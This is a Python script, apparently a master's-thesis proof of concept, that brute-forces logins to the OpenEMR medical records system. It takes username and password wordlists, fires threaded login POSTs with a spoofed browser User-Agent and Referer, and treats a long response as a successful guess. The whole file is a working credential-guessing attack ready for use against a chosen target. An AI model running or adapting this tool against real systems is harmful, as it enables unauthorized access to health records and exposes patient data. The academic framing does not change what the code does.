# TFM: 
# Center: IMF Master Cybersecurity Deloitte Online 
# Author: M3str3 <namestre3@protonmail.com>

import requests
import argparse
import threading

endpoint = "{}://{}/interface/main/main_screen.php?auth=login&site=default"
FOUND = []

def try_password(url: str, headers: dict, username: str, password: str) -> requests.Response:
    global FOUND
    data = {
        "new_login_session_management": 1,
        "authProvider": "Default",
        "authUser": username,
        "clearPass": password,
        "languageChoice": 1
    }
    print(f"[*] Sending POST request with {username}:{password}")
    response = requests.post(url=url, headers=headers, data=data)
    if len(response.text) > 40000:
        print(f"[#] Password found -> {username}:{password}")
        FOUND.append(f"{username}:{password}")
    else:
        print(f"[!] {username}:{password}")
    return response

def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Target IP or domain", required=True)
    parser.add_argument("-s", "--ssl", action="store_true", help="Use HTTPS if enabled")
    parser.add_argument("-u", "--username", help="Username to log in with")
    parser.add_argument("-ul", "--userlist", help="File with a list of usernames to try")
    parser.add_argument("-p", "--password", help="Single password to test")
    parser.add_argument("-pl", "--passlist", help="File with a list of possible passwords")
    args = parser.parse_args()

    if not args.username and not args.userlist:
        print("[ERROR] You need to specify either a --username or a --userlist")
        exit(0)
    
    if not args.password and not args.passlist:
        print("[ERROR] You need to specify either a password or a password list")
        exit(0)

    scheme = "https" if args.ssl else "http"
    url = endpoint.format(scheme, args.target)
    print(f"[*] Attacking {url}....")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": f"{scheme}://{args.target}/openemr/interface/login/login.php?site=default",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }

    usernames = []
    if args.username:
        usernames.append(args.username)
    if args.userlist:
        with open(args.userlist, 'r') as file:
            usernames.extend([line.strip() for line in file.readlines()])

    passwords = []
    if args.password:
        passwords.append(args.password)
    if args.passlist:
        with open(args.passlist, 'r') as file:
            passwords.extend([line.strip() for line in file.readlines()])

    threads: list[threading.Thread] = []
    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=try_password, args=(url, headers, username, password))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

    print("[RESULTS] Users & Passwords")
    print("="*60)
    for found in FOUND:
        print(f"[#] {found}")
    print("="*60)

if __name__ == "__main__":
    print("="*60)
    print(" " * 10 + "Proof of Concept - brute force")
    print(" " * 10 + "IMF Master Cybersecurity Deloitte Online")
    print(" " * 10 + "Author: M3str3 <namestre3@protonmail.com>")
    print("="*60)

    main()
